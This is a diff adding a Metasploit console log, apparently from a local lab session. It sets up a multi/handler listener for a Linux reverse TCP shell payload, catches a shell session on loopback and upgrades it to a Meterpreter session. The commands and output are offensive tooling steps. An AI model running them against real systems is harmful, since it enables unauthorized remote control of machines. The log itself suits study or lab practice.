@@ -1,0 +1,29 @@
+msf5 exploit(multi/handler) > set lport 9999
+lport => 9999
+msf5 exploit(multi/handler) > set lhost 127.0.0.1
+lhost => 127.0.0.1
+msf5 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
+payload => linux/x86/shell/reverse_tcp
+msf5 exploit(multi/handler) > exploit
+
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:9999
+[*] Sending stage (36 bytes) to 127.0.0.1
+[*] Command shell session 1 opened (127.0.0.1:9999 -> 127.0.0.1:50404) at 2020-09-06 04:27:35 -0400
+
+background
+
+Background session 1? [y/N]  y
+msf5 exploit(multi/handler) > session -u 1
+[-] Unknown command: session.
+msf5 exploit(multi/handler) > sessions -u 1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4433 
+[*] Sending stage (980808 bytes) to 127.0.0.1
+[*] Meterpreter session 2 opened (127.0.0.1:4433 -> 127.0.0.1:36364) at 2020-09-06 04:28:08 -0400
+[*] Command stager progress: 100.00% (773/773 bytes)
+msf5 exploit(multi/handler) > 
